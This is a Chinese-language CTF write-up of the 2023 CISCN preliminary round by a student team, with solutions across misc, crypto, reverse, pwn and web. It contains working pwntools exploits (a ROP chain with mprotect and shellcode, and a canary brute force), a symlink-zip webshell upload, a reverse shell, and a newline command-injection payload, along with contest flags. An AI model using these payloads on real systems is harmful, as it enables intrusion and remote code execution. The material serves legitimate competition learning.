---
title: 2023CISCN初赛
date: 2023-06-05 20:13:00
tags:
- crypto
- web
- pwn
- misc
- re
categories:
- [比赛]
---

# 一、战队信息

战队名称：R3ape1

战队排名：171

# 二、解题情况

![image-20230605212532028](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052125141.png)

# 三、解题过程

## MISC

 

### 签到卡

![image-20230605212550137](C:\Users\16956\AppData\Roaming\Typora\typora-user-images\image-20230605212550137.png)

根据提示可以知道穿孔卡片机里面执行的是python脚本，那就直接用python语句来读取flag就行

print(open('/flag').read())

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image006.gif)

得到flag，**flag{3b78ec89-8a1c-424d-a9eb-97d63648846e}**

 

### 被加密的生产流量

打开流量包发现是modbus协议，还查找了许多资料，但其实flag直接追踪tcp流就可

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052128383.gif)

在0流获取base32编码拼接，解码得到flag

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052128388.gif)

**flag{c1f_fi1g_1000}**

 

### 国粹

附件得到三张图片

其中题目.png作为每一块麻将所代表的数字，按顺序标记一下

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052129430.gif)

a.png和k.png分别作为横纵坐标，用python脚本打点画一个坐标图

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052129432.gif)

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052129439.gif)

```python
from matplotlib import pyplot as plt
x = [1,1,1,1,2,2,2,2,2,2,2,3,3,3,3,3,3,3,3,3,3,3,4,4,4,4,4,4,4,4,4,4,4,4,4,4,5,5,5,5,5,5,5,5,5,5,5,5,6,6,6,6,6,6,6,6,6,6,6,7,7,7,7,7,7,7,7,7,7,7,7,7,7,7,8,8,8,8,8,8,8,8,8,8,8,8,8,9,9,9,9,9,9,10,10,12,12,12,12,13,13,13,13,13,13,13,13,13,13,13,13,13,13,14,14,14,14,14,14,14,14,15,15,15,15,15,15,15,16,16,16,16,16,16,16,16,17,17,17,17,17,17,17,17,18,18,18,18,18,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,19,20,22,22,22,22,22,22,22,22,22,22,22,22,23,23,23,23,23,23,23,23,23,23,23,23,23,24,24,24,24,24,24,24,24,24,24,25,25,25,25,25,25,25,25,25,25,25,26,26,26,26,26,26,26,26,26,26,27,27,27,27,27,27,27,27,27,27,27,28,28,28,28,28,28,28,28,28,28,28,28,28,29,29,29,29,29,31,31,31,31,31,31,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,33,33,33,33,33,33,33,33,33,33,33,34,34,34,34,34,34,34,34,34,35,35,35,35,35,35,35,35,35,35,35,36,36,36,36,36,36,36,37,37,37,37,37,37,37,37,37,38,38,38,38,38,38,38,38,38,38,38,38,38,38,38,38,38,39,39,39]

y = [4,5,10,10,30,3,4,5,6,10,29,30,3,4,10,16.17,22,23,24,25,29,30,2,3,4,5,10,15,16,18,21,22,24,25,29,30,3,4,10,15,17,18,19,21,22,25,28,29,3,4,10,15,16,18,19,21,22,25,29,34,10,11,12,13,15,18,19,22,23,24,25,29,30,3,4,11,12,15,16,17,18,19,20,25,29,30,20,21,23,24,30,31,22,24,22,23,24,25,2,3,3,4,9,10,11,12,16,17,18,19,24,25,2,5,6,9,12,18,22,23,5,9,12,18,19,22,23,4,5,9,12,17,18,23,24,3,4,9,12,16,17,24,25,3,9,12,16,25,3,4,5,6,9,10,11,12,16,17,18,19,21,22,23,24,25,10,11,3,4,5,6,10,11,12,17,18,19,24,25,3,6,7,9,10,16,17,19,20,22,23,24,25,3,6,7,9,10,15,18,19,23,24,3,6,7,10,11,12,16,19,20,24,25,3,6,7,12,13,16,19,20,24,25,3,6,7,9,12,13,16,19,20,24,25,3,4,6,9,10,11,12,16,17,19,20,24,25,4,5,17,18,19,10,11,12,13,25,31,4,5,6,10,11,12,13,17,18,19,23,24,25,26,32,3,4,5,6,7,12,16,17,23,24,26,32,6,7,11,16,17,23,24,26,32,6,11,12,17,18,19,23,24,25,26,33,5,12,13,19,20,26,32,4,5,13,16,19,20,25,26,32,4,5,6,7,9,10,11,12,13,16,17,18,19,24,25,31,32,23,24,31]

plt.plot(x, y, 'rH')
plt.show()
```



 

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image018.jpg)

得到flag，**flag{202305012359}**

 

### pyshell

这题思路比较简单，只是读取文件，但是一开始尝试的时候发现os，commands，subprocess，shlex和popen这些模块直接import的时候全部都被禁用了

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052129226.gif)

这题需要用拼接字符的方法去形成python语句来进行命令执行，而且一行有七个字符的限制

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052129231.gif)

拼接语句并执行

得到flag，**flag{6e363201-df3c-4957-9842-e0f79740a8df}**

 

### 问卷

填写问卷得到flag

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image024.jpg)

 

## Crypto 

### 基于国密SM2算法的密钥密文分发

跟着题目给的文档进行复现

首先先在线网站生成自己的private_keyA和public_keyA

https://const.net.cn/tool/sm2/genkey/

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052130855.gif)

再将个人信息发送到/api/login获取选手id（汉字需要进行url编码）

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052130860.jpg)

再用获取到的id和刚才生成的public_keyA发送到/api/allkey获取public_keyB和private_keyB

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052130868.jpg)

在/api/quantum获取quantumString

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052130859.jpg)

接着以为就是要进行sm2和sm4解密了，但可以直接/api/search获取解密之后的quantumString

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052130867.jpg)

再用该string进行check

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052130869.jpg)

接着再次search就可以获得flag了

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052130210.jpg)

**flag{3e619f88-5b3c-4be2-8c9a-94067afa2a5e}**

 

### Sign_in_passwd

拿到flag附件打开

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image040.jpg)

是个替换码表的base64解密

第二行urldecode得到base64码表

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image042.jpg)

将第一行的密文进行base64换表解码

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image044.gif)

得到**flag{8e4b2888-6148-4003-b725-3ff0d93a6ee4}**

 

### 可信度量

非预期出了ssh连上以后执行命令

grep -ra "flag{" / 2>/dev/null

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image046.gif)

 

## Reverse

### ezbyte

**参考文章**[http://43.138.162.163:8090/archives/2022-dsctfchu-sai-nothing-writeup和https://richar.top/nothingchu-ti-si-lu-ji-wp/](http://43.138.162.163:8090/archives/2022-dsctfchu-sai-nothing-writeup和https:/richar.top/nothingchu-ti-si-lu-ji-wp/)

**根据题目可知这道题大概是考察DWARF字节码，readelf -Wwf 可以查看DWARF字节码**

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image048.gif)

字节码很长但是我们只要看其中的r12表达式

先看ida

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image050.gif)

首先要进入到yes需要r13与r12相等，而xor r13，r13把r13清零了，所以只要r12等于0就行了

再根据之前的字节码分析得出

`((a3 + 1512312) ^ 0x2D393663614447B1)+ ((a1 + 1892739) ^ 0x35626665394D17E8)+ ((a2 + 8971237) ^ 0x65342D6530C04912) + ((a4 + 9123704) ^ 0x6336396431BE9AD9)=0`成立就行

写出exp

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image052.gif)

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image054.gif)

在拼接上上面的字符

**flag{e609efb5-e70e-4e94-ac69-ac31d96c3861}**

 

### babyRE

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image056.gif)

看见这个flag，估计是假的，后面有串list，发现第一个是102就是字符“f“，可是第二个10并不是字符”l“，尝试把102^10，发现就是字符”l“，所以就是list[i]^list[i+1],解出来就是上面的假flag

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image058.jpg)

第一行发现是一种Snap的语言，进入官网运行这个文件

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image060.gif)

发现flag的逻辑

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image062.gif)

根据代码分析

exp

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image064.gif)

 

## pwn

### 烧烤摊儿

购买啤酒功能没有对数量进行负数检查，所以可以用负数来绕过，从而进入gaming函数。gaming函数存在栈溢出，而且程序是静态链接，所以调用mprotect修改内存上的可执行权限，然后写shellcode并执行，从而getshell。

**EXP**：

```python
from pwn import *
#from LibcSearcher import *
io = process("./pwn")
context(arch="amd64",os="linux")
context.log_level = "debug"
io = remote('39.106.71.184',34447)
elf = ELF("./pwn")

sd    = lambda data        :io.send(data) 
sa    = lambda delim,data     :io.sendafter(delim, data)
sl    = lambda data        :io.sendline(data)
sla   = lambda delim,data     :io.sendlineafter(delim, data)
sda   = lambda delim,data     :io.sendafter(delim, data)
rcn   = lambda numb=4096      :io.recv(numb, timeout = 3)
rl    = lambda           :io.recvline()
ru    = lambda delims       :io.recvuntil(delims)
uu32   = lambda data        :u32(data.ljust(4, b'\x00'))
uu64   = lambda data        :u64(data.ljust(8, b'\x00'))
li    = lambda tag, addr      :log.info(tag + ': {:#x}'.format(addr))
ls    = lambda tag, addr      :log.success(tag + ': {:#x}'.format(addr))
lsh   = lambda tag, addr      :LibcSearcher(tag, addr)
interactive = lambda         :io.interactive()
printf  = lambda index        :success(hex(index))
getadd  = lambda           :u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

sl(str(1))
sl(str(1))
sl(str(-200000))
sl(str(4))
sl(str(5))
pop_rdi = 0x40264f
pop_rsi = 0x40a67e
pop_rdx_rbx = 0x4a404b
mprotect = 0x458B00
read=0x457DC0
payload=b'a'*0x28+p64(pop_rdi)+p64(0x4eA000)+p64(pop_rsi)+p64(0x1000)+p64(pop_rdx_rbx)+p64(7)+p64(0)+p64(mprotect)+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(0x4eA000)+p64(pop_rdx_rbx)+p64(0x100)+p64(0)+p64(read)+p64(0x4eA000)
sl(payload)
sl(b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05')
interactive()
```



 

### funcanary

有fork函数和栈溢出，所以直接爆破canary，虽然给了后门，但开了PIE，所以爆破后门地址最低二字节。

**EXP**：

```python
from pwn import *
io = process("./pwn")
context(arch="amd64",os="linux")
context.log_level = "debug"
io = remote('39.106.48.123',21251)
elf = ELF("./pwn")
#libc = ELF("./")

sd    = lambda data        :io.send(data) 
sa    = lambda delim,data     :io.sendafter(delim, data)
sl    = lambda data        :io.sendline(data)
sla   = lambda delim,data     :io.sendlineafter(delim, data)
sda   = lambda delim,data     :io.sendafter(delim, data)
rcn   = lambda numb=4096      :io.recv(numb, timeout = 3)
rl    = lambda           :io.recvline()
ru    = lambda delims       :io.recvuntil(delims)
uu32   = lambda data        :u32(data.ljust(4, b'\x00'))
uu64   = lambda data        :u64(data.ljust(8, b'\x00'))
li    = lambda tag, addr      :log.info(tag + ': {:#x}'.format(addr))
ls    = lambda tag, addr      :log.success(tag + ': {:#x}'.format(addr))
lsh   = lambda tag, addr      :LibcSearcher(tag, addr)
interactive = lambda         :io.interactive()
printf  = lambda index        :success(hex(index))
getadd  = lambda           :u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

canary = b'\x00'
while len(canary) < 8:
  for i in range(1,255):
    ru(b'welcome\n')
    payload = b'a'*0x68 + canary + p8(i)
    sd(payload)
    text = io.recvline()
    if b'stack smashing' not in text:
        canary += p8(i)  
        break

printf(uu64(canary))
payload = b'a'*0x68 + canary + p64(0) + p16(0x5228)
sda(b'welcome\n', payload) 
interactive()
```



 

## web

### unzip

随便上传一个文件，看到返回了如下代码

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$finfo = finfo_open(FILEINFO_MIME_TYPE);
if (finfo_file($finfo, $_FILES["file"]["tmp_name"]) === 'application/zip'){
  exec('cd /tmp && unzip -o ' . $_FILES["file"]["tmp_name"]);
};
```



我们看到这里判断了上传文件类型application/zip为zip文件，之后执行了exec('cd /tmp && unzip -o ' . $_FILES["file"]["tmp_name"]);到tmp但是我们无法直接访问呢，所以我们通过制作软路由来绕过/tmp链接到/var/www/html然后把shell写进去即可；

上传压缩包压缩包内容如下

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image066.gif)

在R3ape1中写入一句话之后

上传蚁剑连接shell到根目录获取flag

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image068.gif)

 

### BackendService

搜到相关漏洞文章:https://xz.aliyun.com/t/11493

创建新用户

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image070.gif)

在源码中找id

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image072.gif)

新增配置

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image074.gif)

反弹+监听+获取flag

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image076.gif)

 

 

### dumpit

/?db=&table_2_dump=%0a%20env

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/clip_image078.gif)

 

 

 

 